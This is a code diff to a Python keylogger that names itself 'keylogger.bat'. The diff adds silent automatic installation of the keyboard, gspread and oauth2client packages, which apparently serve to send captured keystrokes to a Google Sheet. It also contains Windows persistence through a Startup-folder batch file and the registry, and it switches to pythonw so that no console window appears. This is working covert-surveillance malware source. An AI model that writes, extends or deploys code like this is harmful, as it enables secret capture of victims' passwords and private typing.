@@ -1,10 +1,44 @@
-from winreg import *
-import keyboard
-import json
-import gspread
-from oauth2client.client import SignedJwtAssertionCredentials
-import getpass
-import os
+try:
+    from pip import main as pipmain
+except:
+    from pip._internal import main as pipmain
+
+def install(package):
+    pipmain(['install', package])
+
+try:
+    import keyboard
+except ImportError:
+    install('keyboard')
+    import keyboard
+try:
+    import json
+except ImportError:
+    install('json')
+    import json
+try:
+    import gspread
+except ImportError:
+    install('gspread')
+    import gspread
+try:
+    from oauth2client.client import SignedJwtAssertionCredentials
+except ImportError:
+    install('oauth2client')
+    from oauth2client.client import SignedJwtAssertionCredentials
+try:
+    import getpass
+except:
+    install('getpass')
+    import getpass
+try:
+    import os
+except:
+    install('os')
+    import os
+
+if os.name == "nt":
+    from winreg import *
 
 buf = []
 column = 0
@@ -12,6 +46,8 @@ row = 1
 
 SHIFT_KEYS = {'`' : '~', '1' : '!', '2' : '@', '3' : '#', '4' : '$', '5' : '%', '6' : '^', '7': '&',
               '8' : '*','9' : '(', '0' : ')' , '-' : '_', '=' : '+','[':'{', ']' : '}'}
+
+
 def add_to_startup():
     if os.name == "nt":
         add_to_registry_windows()
@@ -28,7 +64,7 @@ def add_to_startup_windows(file_path=""):
         file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % username
     with open(bat_path + '\\' + "keylogger.bat", "w+") as bat_file:
-        bat_file.write("python %s" % file_path)
+        bat_file.write("pythonw %s" % file_path)
 
 def add_to_registry_windows():
     new_file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
